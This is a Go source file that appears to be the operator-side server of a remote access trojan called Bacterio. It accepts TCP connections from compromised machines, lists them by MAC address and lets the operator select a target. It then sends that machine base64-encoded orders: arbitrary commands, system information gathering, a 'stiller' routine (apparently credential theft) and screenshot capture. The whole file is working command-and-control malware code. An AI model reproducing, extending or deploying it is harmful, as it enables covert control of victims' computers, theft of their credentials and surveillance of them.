package service

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"strconv"

	"github.com/fatih/color"
	"github.com/fr13n8/Bacterio/internal/models"
	"github.com/fr13n8/Bacterio/internal/ui"
)

type serverService struct {
	Listener net.Listener
	Target   *models.Connect
	Connects map[string]*models.Connect
}

func NewServerService() *serverService {
	return &serverService{
		Connects: make(map[string]*models.Connect),
	}
}

func (s *serverService) CreateServer(address, port string) *serverService {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		color.Red("error starting server")
	}
	s.Listener = listener
	return s
}

func (s *serverService) HandleConnects() {
	color.Green(fmt.Sprintf("  [~] Your address is: %s", s.Listener.Addr().String()))
	color.Green("  [~] Waiting for connection...")
	go s.AcceptConnections()
}

func (s *serverService) ShowConnects() {
	countConnects := len(s.Connects)
	if countConnects == 0 {
		color.Red("  [-] No connects!")
		return
	}
	ui.RenderTableOfConnects(s.Connects)
}

func (s *serverService) AcceptConnections() {
	for {
		connection, err := s.Listener.Accept()
		if err != nil {
			color.Red("error accepting connection")
			continue
		}

		message, err := s.Read(connection)
		if err != nil {
			fmt.Println(err)
			return
		}
		var connect models.Connect
		if err := json.Unmarshal(message.Data, &connect); err != nil {
			color.Red("error decoding connect: %v", err)
			return
		}

		connect.Connection = connection
		s.AddConnect(connect.MacAddress, &connect)
	}
}

func (s *serverService) AddConnect(key string, device *models.Connect) {
	s.Connects[key] = device
}

func (s *serverService) RemoveConnect(key string) {
	delete(s.Connects, key)
}

func (s *serverService) Send(request models.Message) error {
	marshal, err := json.Marshal(request)
	if err != nil {
		return errors.New(color.RedString("error marshalling request"))
	}
	encoded := base64.StdEncoding.EncodeToString(marshal)
	if err := s.Write(encoded); err != nil {
		return errors.New(color.RedString("error sending command to client"))
	}
	return nil
}

func (s *serverService) Write(v string) error {
	_, err := s.Target.Connection.Write([]byte(v + "\n"))
	return err
}

func (s *serverService) Read(conn net.Conn) (*models.Message, error) {
	message, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return nil, errors.New(color.RedString("error reading response from connection"))
	}
	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		return nil, errors.New(color.RedString("error decoding response from connection"))
	}
	var response models.Message
	if err := json.Unmarshal(decoded, &response); err != nil {
		return nil, err
	}
	return &response, err
}

func (s *serverService) SetTarget(v []string) *models.Connect {
	if len(v) <= 1 {
		color.Red(" [!] Specify a target index!")
		return nil
	}

	connect, err := s.getDeviceByIndex(v[1])
	if err != nil {
		color.Red("error getting device with index %s", v[1])
		return nil
	}

	s.Target = connect
	return connect
}

func (s *serverService) getDeviceByIndex(i string) (*models.Connect, error) {
	v, err := strconv.Atoi(i)
	if err != nil {
		return nil, err
	}

	var index int
	for _, connect := range s.Connects {
		index++
		if index == v {
			return connect, nil
		}
	}
	return nil, fmt.Errorf("index %d not found", v)
}

func (s *serverService) GetInformation() ([]byte, error) {
	err := s.Send(models.Message{
		Command: "information",
	})
	if err != nil {
		return nil, err
	}

	response, err := s.Read(s.Target.Connection)
	if err != nil {
		return nil, err
	}
	return []byte(color.GreenString(string(response.Data))), nil
}

func (s *serverService) RunCommand(cmd string) ([]byte, error) {
	err := s.Send(models.Message{
		Command: cmd,
	})
	if err != nil {
		return nil, err
	}

	response, err := s.Read(s.Target.Connection)
	if err != nil {
		return nil, err
	}

	return response.Data, nil
}

func (s *serverService) RunStiller() (*models.Message, error) {
	err := s.Send(models.Message{
		Command: "stiller",
	})
	if err != nil {
		return nil, err
	}

	response, err := s.Read(s.Target.Connection)
	if err != nil {
		return nil, err
	}

	return response, nil
}

func (s *serverService) TakeScreenshot() ([]byte, error) {
	err := s.Send(models.Message{
		Command: "screenshot",
	})
	if err != nil {
		return nil, errors.New(color.RedString("error taking screenshot"))
	}

	response, err := s.Read(s.Target.Connection)
	if err != nil {
		return nil, err
	}

	return response.Data, nil
}
